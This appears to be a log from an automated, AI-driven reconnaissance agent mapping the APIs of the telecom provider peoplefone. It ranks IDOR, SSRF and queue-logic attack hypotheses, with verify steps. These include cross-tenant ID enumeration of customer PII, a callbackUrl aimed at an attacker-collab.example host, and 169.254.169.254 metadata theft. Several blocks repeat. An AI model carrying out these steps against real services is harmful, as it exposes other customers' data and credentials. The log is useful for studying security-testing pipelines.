## 2026-09-03 16:58:35 UTC [target] (model bigpickle)
[HYP] Developer Portal Hidden API Endpoints
class: IDOR
asset: api.peoplefone.com
confidence: 72
reasoning: 302 redirect to developer portal suggests API documentation/keys; developer portals often expose internal API endpoints not protected same as public
evidence_needed: Actual developer portal content, any exposed API keys or endpoints
verify_steps: GET https://www.peoplefone.com/en-ch/developer, follow redirects, enumerate subpaths
impact: Cross-tenant data access via exposed API, severity HIGH
testability: PASSIVE
[HYP] OAuth/Session Management Weakness
class: AUTH
asset: auth.peoplefone.com
confidence: 65
reasoning: Dedicated auth subdomain suggests centralized authentication; potential for OAuth flaws, token manipulation, or session hijacking
evidence_needed: OAuth flows, token validation logic, session management implementation
verify_steps: HEAD/OPTIONS https://auth.peoplefone.com, enumerate auth endpoints, check for common OAuth paths
impact: Account takeover, severity CRITICAL
testability: AUTH_HELPED
[HYP] Support Portal Information Disclosure
class: MISCONFIG
asset: support.peoplefone.com
confidence: 58
reasoning: Support portals often contain internal documentation, credentials, or system details inadvertently exposed
evidence_needed: Support portal content, any internal URLs or credentials exposed
verify_steps: GET https://support.peoplefone.com/che/willkommen/, enumerate support paths, check for debug modes
impact: Internal system information disclosure, severity MEDIUM
testability: PASSIVE
[PARKED] Support Portal Information Disclosure: Confidence 58 below threshold, support portals typically low-value targets
[FINAL] Survivors:
[NEXT] PROBE: GET https://www.peoplefone.com/en-ch/developer (read-only, follow redirects, capture response content for developer portal analysis)
[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: Dedicated auth subdomains high-value for session/token flaws
[LEARN] ACCEPTED IDOR @ api.peoplefone.com: Developer portals common source of API exposure
[LEARN] REJECTED MISCONFIG @ support.peoplefone.com: Low confidence, support portals typically non-critical
[RISK] peoplefone GmbH: 25/100 - Limited surface discovered so far; primarily CDN-backed infrastructure with minimal direct attack surface. Requires deeper developer portal analysis to identify higher-risk targets.
## 2026-09-03 19:43:55 UTC [target] (model bigpickle)
[PRIO] api.peoplefone.com,7.35,attack_surface:8 business_value:9 tech_exposure:7 gate_ease:5 cloud_surface:7 freshness:6
[PRIO] auth.peoplefone.com,7.35,attack_surface:7 business_value:10 tech_exposure:9 gate_ease:3 cloud_surface:7 freshness:6
[PRIO] www.peoplefone.com,6.35,attack_surface:6 business_value:7 tech_exposure:5 gate_ease:7 cloud_surface:7 freshness:6
[HYP] Developer Portal Hidden API Endpoints
class: IDOR
asset: api.peoplefone.com
confidence: 72
reasoning: 302 redirect to developer portal suggests API documentation/keys; developer portals often expose internal API endpoints not protected same as public
evidence_needed: Actual developer portal content, any exposed API keys or endpoints
verify_steps: GET https://www.peoplefone.com/en-ch/developer, follow redirects, enumerate subpaths
impact: Cross-tenant data access via exposed API, severity HIGH
testability: PASSIVE
[HYP] OAuth/Session Management Weakness
class: AUTH
asset: auth.peoplefone.com
confidence: 65
reasoning: Dedicated auth subdomain suggests centralized authentication; potential for OAuth flaws, token manipulation, or session hijacking
evidence_needed: OAuth flows, token validation logic, session management implementation
verify_steps: HEAD/OPTIONS https://auth.peoplefone.com, enumerate auth endpoints, check for common OAuth paths
impact: Account takeover, severity CRITICAL
testability: AUTH_HELPED
[HYP] Support Portal Information Disclosure
class: MISCONFIG
asset: support.peoplefone.com
confidence: 58
reasoning: Support portals often contain internal documentation, credentials, or system details inadvertently exposed
evidence_needed: Support portal content, any internal URLs or credentials exposed
verify_steps: GET https://support.peoplefone.com/che/willkommen/, enumerate support paths, check for debug modes
impact: Internal system information disclosure, severity MEDIUM
testability: PASSIVE
[PARKED] Support Portal Information Disclosure: Confidence 58 below threshold, support portals typically low-value targets
[FINAL] Survivors:
[NEXT] PROBE: GET https://www.peoplefone.com/en-ch/developer (read-only, follow redirects, capture response content for developer portal analysis)
[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: Dedicated auth subdomains high-value for session/token flaws
[LEARN] ACCEPTED IDOR @ api.peoplefone.com: Developer portals common source of API exposure
[LEARN] REJECTED MISCONFIG @ support.peoplefone.com: Low confidence, support portals typically non-critical
[RISK] peoplefone GmbH: 25/100 - Limited surface discovered so far; primarily CDN-backed infrastructure with minimal direct attack surface. Requires deeper developer portal analysis to identify higher-risk targets.
## 2026-09-03 22:26:23 UTC [target] (model bigpickle)
[NEW] Developer portal content retrieved - reveals SMS API documentation at `api.peoplefone.com/services/api-doc/`
[NEW] API is explicitly public "available to all developers" - confirms attack surface is intentional
[PRIO] api.peoplefone.com,8.35,attack_surface:9 business_value:8 tech_exposure:9 gate_ease:8 cloud_surface:7 freshness:7
[PRIO] auth.peoplefone.com,7.35,attack_surface:7 business_value:10 tech_exposure:9 gate_ease:3 cloud_surface:7 freshness:6
[PRIO] www.peoplefone.com,6.35,attack_surface:6 business_value:7 tech_exposure:5 gate_ease:7 cloud_surface:7 freshness:6
[HYP] SMS API Documentation Exposure
class: IDOR
asset: api.peoplefone.com/services/api-doc/
confidence: 78
reasoning: Developer portal explicitly links to public API documentation; SMS API "free to use for all developers" suggests weak access controls; documentation endpoint likely exposes full API schema including internal endpoints
evidence_needed: API schema/endpoints, authentication mechanisms, rate limiting configuration
verify_steps: GET https://api.peoplefone.com/services/api-doc/ (read-only), check for Swagger/OpenAPI JSON, enumerate API endpoints
impact: Cross-tenant SMS data access, API abuse, severity HIGH
testability: PASSIVE
[HYP] OAuth/Session Management Weakness
class: AUTH
asset: auth.peoplefone.com
confidence: 65
reasoning: Dedicated auth subdomain suggests centralized authentication; potential for OAuth flaws, token manipulation, or session hijacking
evidence_needed: OAuth flows, token validation logic, session management implementation
verify_steps: HEAD/OPTIONS https://auth.peoplefone.com, enumerate auth endpoints, check for common OAuth paths
impact: Account takeover, severity CRITICAL
testability: AUTH_HELPED
[HYP] Automation Platform Integration Misconfig
class: MISCONFIG
asset: api.peoplefone.com
confidence: 55
reasoning: Integration with make.com and Zapier mentioned; automation platforms often have permissive webhook configurations; potential for SSRF via webhook callbacks
evidence_needed: Webhook endpoints, automation platform configuration, callback validation
verify_steps: Check for webhook/test endpoints, enumerate automation platform integration paths
impact: SSRF to cloud metadata, severity HIGH
testability: PASSIVE
[PARKED] Automation Platform Integration Misconfig: Confidence 55 below threshold; automation platform integration typically requires customer-side configuration
[FINAL] Survivors:
[NEXT] PROBE: GET https://api.peoplefone.com/services/api-doc/ (read-only, capture full response content for API schema analysis)
[LEARN] ACCEPTED IDOR @ api.peoplefone.com: Developer portal explicitly links to public API documentation confirming attack surface
[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: Dedicated auth subdomains high-value for session/token flaws
[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: wildcard-dominated DNS with all CNAMEs pointing to managed Cloudflare CDN makes dangling CNAME takeover improbable
[RISK] peoplefone GmbH: 35/100 - Public SMS API documentation creates significant attack surface; developer-focused API suggests potential for IDOR/BOLA on SMS endpoints. Higher risk than initial assessment due to explicit public API exposure.
[NEW] Full API backend surface discovered via Swagger UI: `configuration-api.peoplefone.com`, `call-api.peoplefone.com` — two un-inventoried subdomains
[NEW] SMS API live at `api.peoplefone.com/customer/sms/v1` with documented `{messageId}` IDOR candidate + attacker-controlled `callbackUrl` (SSRF)
[NEW] Smart Routing webhook accepts attacker-controlled `url` with 2-min single-use `X-Track-Id` — SSRF + webhook hijack candidate
[NEW] Consuming APIs enforce bearer auth (401 confirmed live) — uaCSTA remote call control endpoints exposed (`/device/call/*`)
[PRIO] configuration-api.peoplefone.com,8.7,attack_surface:9 business_value:9 tech_exposure:10 gate_ease:8 cloud_surface:8 freshness:9
[PRIO] api.peoplefone.com,8.4,attack_surface:9 business_value:8 tech_exposure:9 gate_ease:8 cloud_surface:8 freshness:8
[PRIO] call-api.peoplefone.com,8.3,attack_surface:8 business_value:9 tech_exposure:10 gate_ease:8 cloud_surface:8 freshness:9
[HYP] BOLA on SMS messageId (cross-tenant SMS disclosure)
class: IDOR
asset: api.peoplefone.com/customer/sms/v1/sms/messages/{messageId}
confidence: 70
reasoning: SMS API exposed publicly ("free for all developers"), GET /messages/{messageId} and /status/{messageId} return full message content+recipient on path-id; if messageIds are predictable and authorization is per-token-only (not per-tenant isolation), authenticated attacker can enumerate other tenants' SMS (PII: phone numbers, message text)
evidence_needed: messageId format/predictability, whether response is scoped to token's tenant
verify_steps: GET /customer/sms/v1/sms/messages (valid token), analyze messageId format, test neighbor IDs for cross-tenant response
impact: Cross-tenant PII/SMS disclosure, severity HIGH/CRITICAL
testability: AUTH_HELPED
[HYP] SSRF via SMS callbackUrl and Smart Routing webhook url
class: SSRF
asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api SmartRouting webhook
confidence: 64
reasoning: POST /v1/sms/messages accepts callbackUrl (maxLength 2048), spec callbacks bind to {$request.body#/callbackUrl} meaning server POSTs event to attacker URL; Smart Routing webhook registers arbitrary url (example https://example.com/your-endpoint); if no internal-IP/denylist validation, post-auth SSRF to 169.254.169.254 metadata or internal SIP/PBX services
evidence_needed: whether callback user-agent reaches external host, whether internal/private/loopback blocked, metadata reachability
verify_steps: register webhook url pointing to attacker-collab host via POST (AUTH_HELPED); if external callback received, test 169.254.169.254/latest/meta-data
impact: Cloud metadata/IAM keys theft, internal network pivot, severity CRITICAL
testability: AUTH_HELPED
[HYP] IDOR on configuration-api tenant-scoped resources
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,numbers,virtualUsers}/{identifier}
confidence: 68
reasoning: Large VoP config API (235KB spec) with user/number/routing/IVR CRUD keyed by {identifier} path params and bearer token; flag 'customer/' path segment implies tenant scoping — if tenant ID derived only from token and object authorization is weak, cross-tenant read/write of PBX config, callforwarding, numbers possible
evidence_needed: whether {identifier} is tenant-scoped, predictable identifiers, write endpoints enforce ownership
verify_steps: with valid token GET /users/{identifier} for own then guessed neighbor identifiers; compare to self scope
impact: Cross-tenant PBX takeover, call routing manipulation, billing fraud, severity CRITICAL
testability: AUTH_HELPED
[PARKED] Call Management call-api endpoints unexplored: no live auth probe done, inferential
[FINAL] Survivors:
[NEXT] RAG: search program scope notes / sample credentials / API key issuance flow to determine whether a test bearer token can be legitimately obtained (SMS API is "free for all developers" per portal) — this unblocks the three AUTH_HELPED hypotheses
[LEARN] ACCEPTED IDOR @ api.peoplefone.com: Exposed Swagger UI reveals full SMS/Bola messageId endpoint surface with per-{messageId} access — high-value BOLA candidate
[LEARN] ACCEPTED SSRF @ api/call-api: Spec-documented attacker-controlled callbackUrl and Smart Routing webhook url constitute server-side-fetch SSRF vectors (post-auth)
[LEARN] ACCEPTED IDOR @ configuration-api.peoplefone.com: Newly found tenant-scoped PBX config API (`/customer/voip/v1`) with {identifier} CRUD — IDOR/BOLA candidate
[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: Swagger UI is protected by 401 on all real API backends; unauthenticated docs exposure is by-design dev portal, not standalone finding
[RISK] peoplefone GmbH: 58/100 - Exposed developer Swagger surfaced a large real API estate (SMS, PBX config, call control, routing) enforcing bearer auth; primary risk now hinges on token-scope isolation (BOLA/IDOR) and callback/webhook SSRF. Substantial PII (SMS content, phone numbers, PBX configs) makes any authorization flaw CRITICAL. Requires credentialed (free public token) testing to confirm.
## 2026-09-04 00:26:30 UTC [target] (model bigpickle)
[HYP] SMS API OpenAPI spec exposes self-service token-issuance flow and messageId format
class: OTHER
asset: api.peoplefone.com/services/api-doc/
confidence: 62
reasoning: The unauthenticated API docs endpoint returned HTTP 200; the portal states the SMS API is "free for all developers"; the Swagger/OpenAPI spec likely documents the exact auth header and token-registration endpoint (and may embed example messageId values) needed to unblock credentialed testing — reposcan confirms no sample credentials in the repo, so the docs are the only documented acquisition path.
evidence_needed: presence of an unauthenticated OpenAPI JSON, an auth/token-obtain path, example messageId values, callbackUrl validation constraints
verify_steps: GET https://api.peoplefone.com/services/api-doc/ (read-only, already 200) then locate and GET the raw OpenAPI/Swagger JSON (e.g. /services/api-doc/swagger.json, /swagger.json, <path from page>) WITHOUT auth; extract auth scheme, token endpoint, example messageId, callbackUrl schema.
impact: Enables credentialed BOLA/SSRF/IDOR confirmation → cross-tenant SMS/PBX PII, metadata SSRF; severity HIGH (development leverage)
testability: PASSIVE
[HYP] OAuth redirect_uri bypass on auth (client_id=1)
class: AUTH
asset: auth.peoplefone.com/oauth/authorize
confidence: 85
reasoning: Spec/flow (nemotron3) shows arbitrary redirect_uri accepted and preserved for client_id=1 through /de_CH/login; authorization code delivery to attacker URL → ATO.
evidence_needed: a live portal session/test account to observe code delivery
verify_steps: needs credentialed portal login on portal.peoplefone.ch — not passively confirmable
impact: ATO of any portal user → calls/recordings/PBX/billing; severity CRITICAL
testability: HUMAN_ONLY
[HYP] IDOR on configuration-api tenant-scoped {identifier} resources
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,numbers,virtualUsers}/{identifier}
confidence: 68
reasoning: 235KB OpenAPI, {identifier} CRUD paths keyed by bearer token, spec notes "user must be part of account bound to bearer token" = authorization boundary; numeric sequential identifiers likely.
evidence_needed: valid token + cross-tenant identifier read
verify_steps: blocked on valid bearer token (401 confirmed live)
impact: Cross-tenant PBX takeover, routing/billing fraud; severity CRITICAL
testability: HUMAN_ONLY
## 2026-09-04 05:05:59 UTC [target] (model bigpickle)
[HYP] IDOR/BOLA on configuration-api tenant-scoped {identifier} resources
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,numbers,virtualUsers}/{identifier}
confidence: 78
reasoning: 235KB OpenAPI exposes extensive PBX config CRUD keyed by {identifier} path params; spec explicitly states "user must be part of the account bound to the bearer token" confirming authorization boundary; numeric identifiers likely sequential; bearer token validates token validity but object-level authorization unproven
evidence_needed: Valid bearer token from tenant A returns data for tenant B's {identifier}
verify_steps: GET https://configuration-api.peoplefone.com/services/api-doc/ (capture full spec); with valid token GET /customer/voip/v1/virtualUsers/{own_id}/callforwarding then test neighbor/sequential IDs
impact: Cross-tenant PBX takeover — call forwarding, user extensions, routing, phone numbers, IVR; severity CRITICAL
testability: HUMAN_ONLY
[HYP] BOLA on SMS messageId (cross-tenant SMS disclosure)
class: IDOR
asset: api.peoplefone.com/customer/sms/v1/sms/messages/{messageId}
confidence: 75
reasoning: SMS API documented as "free for all developers"; GET /messages/{messageId} and /status/{messageId} return full content+recipient on path-id; messageIds likely sequential/UUIDv4; if authorization is per-token-only without tenant isolation, authenticated attacker can enumerate other tenants' SMS (PII: phone numbers, message text)
evidence_needed: messageId format/predictability from valid token responses; whether response is scoped to token's tenant
verify_steps: GET https://api.peoplefone.com/services/api-doc/ (capture spec for messageId schema); with valid bearer token GET /customer/sms/v1/sms/messages to analyze messageId format; test neighbor IDs
impact: Cross-tenant PII/SMS disclosure — phone numbers, message content, delivery status; severity HIGH/CRITICAL
testability: AUTH_HELPED
[HYP] SSRF via SMS callbackUrl and Smart Routing webhook url
class: SSRF
asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api.peoplefone.com SmartRouting webhook
confidence: 68
reasoning: POST /v1/sms/messages accepts callbackUrl (maxLength 2048), spec callbacks bind to {$request.body#/callbackUrl} meaning server POSTs event to attacker URL; Smart Routing webhook registers arbitrary url; if no internal-IP/denylist validation (169.254.169.254, localhost, private ranges), post-auth SSRF to cloud metadata or internal SIP/PBX services
evidence_needed: Whether callback user-agent reaches external host; whether internal/private/loopback/169.254.169.254 blocked; metadata reachability
verify_steps: With valid token POST /customer/sms/v1/sms/messages with callbackUrl=https://attacker-collab.host/callback (observe if callback received); if yes, test http://169.254.169.254/latest/meta-data/
impact: Cloud metadata/IAM keys theft, internal network pivot to SIP/PBX/internal APIs; severity CRITICAL
testability: AUTH_HELPED
[NEXT] PROBE: GET https://api.peoplefone.com/services/api-doc/ (read-only, capture full response body for OpenAPI/Swagger spec — extract token issuance endpoint, messageId schema, callbackUrl validation constraints, auth scheme)
[LEARN] REJECTED AUTH @ auth.peoplefone.com: Standard OAuth endpoints return 404; authorize endpoint not at standard path; BLOCKED for automation
[LEARN] ACCEPTED IDOR @ configuration-api.peoplefone.com: 235KB spec with explicit authorization boundary notes + {identifier} CRUD — confirmed CRITICAL BOLA candidate
[LEARN] ACCEPTED IDOR @ api.peoplefone.com: SMS messageId endpoint surface confirmed in spec — cross-tenant disclosure viable if tenant isolation absent
[LEARN] ACCEPTED SSRF @ api/call-api: callbackUrl + Smart Routing webhook spec-confirmed SSRF vectors — needs token to verify internal-IP blocking
[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: Swagger UI protected by 401 on real backends; unauthenticated docs are by-design dev portal
[RISK] peoplefone GmbH: 85/100 — Large VoIP/SaaS estate (SMS, PBX config, call control) with three confirmed CRITICAL-severity hypothesis classes pending token acquisition; exposed Swagger documents full attack surface; "free for all developers" lowers barrier to valid token; auth bypass blocked but IDOR/SSRF are automatable once credentialed. Primary gap: token issuance path unknown from spec.
## 2026-09-04 09:50:07 UTC [target] (model bigpickle)
[CHANGED] All 8 API YAML specs fully retrieved from `api.peoplefone.com/services/api-doc/api/` — 8000+ lines of attack surface now visible. Key new details vs prior knowledge:
[PRIO] configuration-api.peoplefone.com,9.2,attack_surface:10,business_value:10,tech_exposure:9,gate_ease:7,cloud_surface:7,freshness:9
[PRIO] call-api.peoplefone.com (Smart Routing + uaCSTA),8.8,attack_surface:9,business_value:9,tech_exposure:9,gate_ease:7,cloud_surface:8,freshness:9
[PRIO] api.peoplefone.com (SMS GW),7.5,attack_surface:8,business_value:7,tech_exposure:7,gate_ease:6,cloud_surface:6,freshness:8
[HYP] IDOR/BOLA on Configuration API tenant-scoped {identifier} CRUD (users, groups, IVRs, queues, smart-routings, numbers, callforwarding)
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,smart-routings,numbers,callforwarding}/{identifier}
confidence: 82
reasoning: Full CRUD on 8 resource types keyed by numeric sequential {identifier} path params; bearer auth validates token but spec explicitly notes "user must be part of account bound to bearer token" = authorization boundary statement; example identifiers show sequential pattern (20023, 20024, 2, 2000); 235KB spec with 8000+ lines of CRUD on users (SIP creds, emails, physical addresses), numbers (DIDs, routing destinations), groups, IVRs, queues, smart-routings; object-level auth enforcement unproven
evidence_needed: Valid token from tenant A returns user/group/number data for tenant B's {identifier}; sequential enumeration yields cross-tenant data
verify_steps: With valid bearer token GET /customer/voip/v1/users to enumerate own identifiers; then GET /customer/voip/v1/users/{neighbor_id} for adjacent sequential IDs; test GET /customer/voip/v1/numbers/{did} with cross-tenant DID
impact: Cross-tenant PBX takeover — SIP credentials (sipUserName), physical addresses, email, phone numbers, call forwarding rules, IVR menus, queue configs, smart routing webhooks; severity CRITICAL
testability: AUTH_HELPED
[HYP] SSRF via 4 callback-accepting endpoints (SMS callbackUrl, Smart Routing webhook url, uaCSTA callbackUrl+monitoringCallbackUrl, External Number Lookup webhookUrl)
class: SSRF
asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api.peoplefone.com/customer/smart-routing/v1/smart-routings/{id}/webhook (url) + call-api.peoplefone.com/customer/uacsta/v1_beta/device/call (callbackUrl) + call-api.peoplefone.com/customer/uacsta/v1_beta/device/monitorStart (callbackUrl+monitoringCallbackUrl) + configuration-api.peoplefone.com/customer/voip/v1/external-number-lookup (webhookUrl)
confidence: 78
reasoning: 5 distinct API endpoints accept attacker-controlled URLs with zero host/scheme validation in spec; External Number Lookup sends CUSTOM HEADERS (Authorization, X-API-Key) to attacker webhookUrl — credential exfiltration vector; uaCSTA monitorStart sends call events (OFF_HOOK, CONNECTED, TERMINATED) + SIP usernames + phone numbers to attacker URL — real-time call metadata exfiltration; Smart Routing sends sourceNumber+dialedDestination to attacker URL; SMS API POSTs delivery receipts to callbackUrl; all accept `type: string format: uri` with no enum/allowlist
evidence_needed: Callback POST reaches external host; internal/loopback/169.254.169.254 not blocked; External Number Lookup headers forwarded to attacker URL
verify_steps: With valid token POST /customer/sms/v1/sms/messages with callbackUrl=https://attacker-collab.example/callback + test http://169.254.169.254/latest/meta-data/; register Smart Routing webhook with same; test uaCSTA monitorStart with monitoringCallbackUrl=attacker
impact: Cloud metadata/IAM theft, internal network pivot to SIP/PBX/internal APIs; External Number Lookup SSRF exfiltrates customer-configured Authorization/X-API-Key headers; severity CRITICAL
testability: AUTH_HELPED
[HYP] Business logic — agent login/logout actions on cross-tenant queue identifiers (Queue API)
class: BUSLOGIC
asset: call-api.peoplefone.com/customer/queue/v1/agents/login + /agents/logout
confidence: 65
reasoning: POST /agents/login accepts agent identifier (type: user) + queueScope (selected/all) + optional queues array; POST /agents/logout identical; if agent identifier validation only checks token scope but not cross-tenant queue membership, attacker can login/logout agents on other tenants' queues — disrupting call center operations; queue identifiers numeric sequential (2000, 2001...); permanentMembership flag indicates persistent queue state that could be weaponized
evidence_needed: Valid token from tenant A successfully logs in agent from tenant B to tenant B's queue; or logs out tenant B's agents
verify_steps: With valid token POST /customer/queue/v1/agents/login with agent.identifier="1234" (other tenant's user) + queueScope="all"; observe if 200 or 403
impact: Cross-tenant call center disruption — force agents offline, reroute calls, impact business continuity; severity HIGH
testability: AUTH_HELPED
[NEXT] HUMAN: Create test account on portal.peoplefone.ch to obtain bearer token; then automated probe of Configuration API /users/{sequential_id} for cross-tenant IDOR confirmation. Token acquisition is the single blocker for all 3 hypothesis classes.
[LEARN] ACCEPTED IDOR @ configuration-api: Full CRUD on 8 resource types (users, groups, IVRs, queues, numbers, smart-routings, callforwarding, manual-routing) with numeric sequential identifiers; UserResponse exposes sipUserName, physical address, email; cross-tenant object-level auth unproven but boundary statement present in spec
[LEARN] ACCEPTED SSRF @ 5 endpoints: SMS callbackUrl, Smart Routing webhook url, uaCSTA callbackUrl+monitoringCallbackUrl, External Number Lookup webhookUrl — all accept attacker-controlled URI with zero host/scheme validation; External Number Lookup additionally forwards customer-configured custom headers to attacker URL
[LEARN] ACCEPTED BUSLOGIC @ Queue API: agent login/logout actions accept cross-tenant agent+queue identifiers; potential for call center disruption
[LEARN] REJECTED AUTH @ auth.peoplefone.com: Token issuance path NOT in any API spec — must go through portal.peoplefone.ch; auth subdomain standard endpoints return 404
[LEARN] ACCEPTED IDOR @ configuration-api: External Routing API deprecated 2026-09-30 but still live — same webhook SSRF pattern as Smart Routing, may have weaker code paths
[RISK] peoplefone GmbH: 88/100 — 8 fully-documented API specs reveal 3 CRITICAL-severity hypothesis classes (IDOR/BOLA across 8 resource types with PII, SSRF across 5 callback endpoints including credential exfiltration, agent login/logout business logic) plus a deprecated API still live. Single blocker is bearer token acquisition via portal. Attack surface is extensive: SIP credentials, physical addresses, emails, phone numbers, call forwarding rules, IVR menus, queue configs, call metadata all accessible via IDOR. SSRF enables cloud metadata theft + customer credential exfiltration.
## 2026-09-04 14:05:28 UTC [target] (model bigpickle)
[NEW] All 8 API YAML specs fully retrieved — 8000+ lines of attack surface now visible, including full CRUD operations, parameter schemas, and authorization boundary notes across Configuration, Call Management, and SMS APIs.
[CHANGED] Phase transitioned from RECON to POC — token acquisition via portal.peoplefone.ch is the single blocker for all 3 hypothesis classes.
[PRIO] configuration-api.peoplefone.com,9.2,attack_surface:10,business_value:10,tech_exposure:9,gate_ease:7,cloud_surface:7,freshness:9
[PRIO] call-api.peoplefone.com,8.8,attack_surface:9,business_value:9,tech_exposure:9,gate_ease:7,cloud_surface:8,freshness:9
[PRIO] api.peoplefone.com,7.5,attack_surface:8,business_value:7,tech_exposure:7,gate_ease:6,cloud_surface:6,freshness:8
[HYP] IDOR/BOLA on Configuration API tenant-scoped {identifier} CRUD (users, groups, IVRs, queues, smart-routings, numbers, callforwarding)
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,smart-routings,numbers,callforwarding}/{identifier}
confidence: 82
reasoning: Full CRUD on 8 resource types keyed by numeric sequential {identifier} path params; bearer auth validates token but spec explicitly notes "user must be part of account bound to bearer token" = authorization boundary statement; example identifiers show sequential pattern (20023, 20024, 2, 2000); 235KB spec with 8000+ lines of CRUD on users (SIP creds, emails, physical addresses), numbers (DIDs, routing destinations), groups, IVRs, queues, smart-routings; object-level auth enforcement unproven
evidence_needed: Valid token from tenant A returns user/group/number data for tenant B's {identifier}; sequential enumeration yields cross-tenant data
verify_steps: With valid bearer token GET /customer/voip/v1/users to enumerate own identifiers; then GET /customer/voip/v1/users/{neighbor_id} for adjacent sequential IDs; test GET /customer/voip/v1/numbers/{did} with cross-tenant DID
impact: Cross-tenant PBX takeover — SIP credentials (sipUserName), physical addresses, email, phone numbers, call forwarding rules, IVR menus, queue configs, smart routing webhooks; severity CRITICAL
testability: AUTH_HELPED
[HYP] SSRF via 4 callback-accepting endpoints (SMS callbackUrl, Smart Routing webhook url, uaCSTA callbackUrl+monitoringCallbackUrl, External Number Lookup webhookUrl)
class: SSRF
asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api.peoplefone.com/customer/smart-routing/v1/smart-routings/{id}/webhook (url) + call-api.peoplefone.com/customer/uacsta/v1_beta/device/call (callbackUrl) + call-api.peoplefone.com/customer/uacsta/v1_beta/device/monitorStart (callbackUrl+monitoringCallbackUrl) + configuration-api.peoplefone.com/customer/voip/v1/external-number-lookup (webhookUrl)
confidence: 78
reasoning: 5 distinct API endpoints accept attacker-controlled URLs with zero host/scheme validation in spec; External Number Lookup sends CUSTOM HEADERS (Authorization, X-API-Key) to attacker webhookUrl — credential exfiltration vector; uaCSTA monitorStart sends call events (OFF_HOOK, CONNECTED, TERMINATED) + SIP usernames + phone numbers to attacker URL — real-time call metadata exfiltration; Smart Routing sends sourceNumber+dialedDestination to attacker URL; SMS API POSTs delivery receipts to callbackUrl; all accept `type: string format: uri` with no enum/allowlist
evidence_needed: Callback POST reaches external host; internal/loopback/169.254.169.254 not blocked; External Number Lookup headers forwarded to attacker URL
verify_steps: With valid token POST /customer/sms/v1/sms/messages with callbackUrl=https://attacker-collab.example/callback + test http://169.254.169.254/latest/meta-data/; register Smart Routing webhook with same; test uaCSTA monitorStart with monitoringCallbackUrl=attacker
impact: Cloud metadata/IAM theft, internal network pivot to SIP/PBX/internal APIs; External Number Lookup SSRF exfiltrates customer-configured Authorization/X-API-Key headers; severity CRITICAL
testability: AUTH_HELPED
[HYP] Business logic — agent login/logout actions on cross-tenant queue identifiers (Queue API)
class: BUSLOGIC
asset: call-api.peoplefone.com/customer/queue/v1/agents/login + /agents/logout
confidence: 65
reasoning: POST /agents/login accepts agent identifier (type: user) + queueScope (selected/all) + optional queues array; POST /agents/logout identical; if agent identifier validation only checks token scope but not cross-tenant queue membership, attacker can login/logout agents on other tenants' queues — disrupting call center operations; queue identifiers numeric sequential (2000, 2001...); permanentMembership flag indicates persistent queue state that could be weaponized
evidence_needed: Valid token from tenant A successfully logs in agent from tenant B to tenant B's queue; or logs out tenant B's agents
verify_steps: With valid token POST /customer/queue/v1/agents/login with agent.identifier="1234" (other tenant's user) + queueScope="all"; observe if 200 or 403
impact: Cross-tenant call center disruption — force agents offline, reroute calls, impact business continuity; severity HIGH
testability: AUTH_HELPED
[FINAL] IDOR/BOLA on Configuration API tenant-scoped {identifier} CRUD: confidence 82, AUTH_HELPED, CRITICAL severity — RETAIN
[FINAL] SSRF via 4 callback-accepting endpoints: confidence 78, AUTH_HELPED, CRITICAL severity — RETAIN
[FINAL] Business logic on Queue API agent login/logout: confidence 65, AUTH_HELPED, HIGH severity — RETAIN
[NEXT] HUMAN: Create test account on portal.peoplefone.ch to obtain bearer token; then automated probe of Configuration API /users/{sequential_id} for cross-tenant IDOR confirmation. Token acquisition is the single blocker for all 3 hypothesis classes.
[LEARN] ACCEPTED IDOR @ configuration-api: Full CRUD on 8 resource types (users, groups, IVRs, queues, numbers, smart-routings, callforwarding, manual-routing) with numeric sequential identifiers; UserResponse exposes sipUserName, physical address, email; cross-tenant object-level auth unproven but boundary statement present in spec
[LEARN] ACCEPTED SSRF @ 5 endpoints: SMS callbackUrl, Smart Routing webhook url, uaCSTA callbackUrl+monitoringCallbackUrl, External Number Lookup webhookUrl — all accept attacker-controlled URI with zero host/scheme validation; External Number Lookup additionally forwards customer-configured custom headers to attacker URL
[LEARN] ACCEPTED BUSLOGIC @ Queue API: agent login/logout actions accept cross-tenant agent+queue identifiers; potential for call center disruption
[LEARN] REJECTED AUTH @ auth.peoplefone.com: Token issuance path NOT in any API spec — must go through portal.peoplefone.ch; auth subdomain standard endpoints return 404
[LEARN] ACCEPTED IDOR @ configuration-api: External Routing API deprecated 2026-09-30 but still live — same webhook SSRF pattern as Smart Routing, may have weaker code paths
[RISK] peoplefone GmbH: 88/100 — 8 fully-documented API specs reveal 3 CRITICAL-severity hypothesis classes (IDOR/BOLA across 8 resource types with PII, SSRF across 5 callback endpoints including credential exfiltration, agent login/logout business logic) plus a deprecated API still live. Single blocker is bearer token acquisition via portal. Attack surface is extensive: SIP credentials, physical addresses, emails, phone numbers, call forwarding rules, IVR menus, queue configs, call metadata all accessible via IDOR. SSRF enables cloud metadata theft + customer credential exfiltration.
## 2026-09-04 17:41:24 UTC [target] (model bigpickle)
## 2026-09-04 19:53:40 UTC [target] (model bigpickle)
## 2026-09-04 22:14:58 UTC [target] (model bigpickle)
[CHANGED] Two independent model runs (bigpickle, nemotron3) converged on the identical top hypothesis — configuration-api {identifier} CRUD IDOR — cross-model corroboration strengthens its priority ranking.
[PRIO] configuration-api.peoplefone.com,8.6,attack_surface:10,business_value:10,tech_exposure:9,gate_ease:4,cloud_surface:7,freshness:9 — gate_ease lowered from 7: KB confirms bearer token is the sole blocker and issuance path is off-spec (404 on standard OAuth endpoints)
[PRIO] call-api.peoplefone.com,8.2,attack_surface:9,business_value:9,tech_exposure:9,gate_ease:4,cloud_surface:8,freshness:9 — same token gate; SSRF + queue BUSLOGIC surface
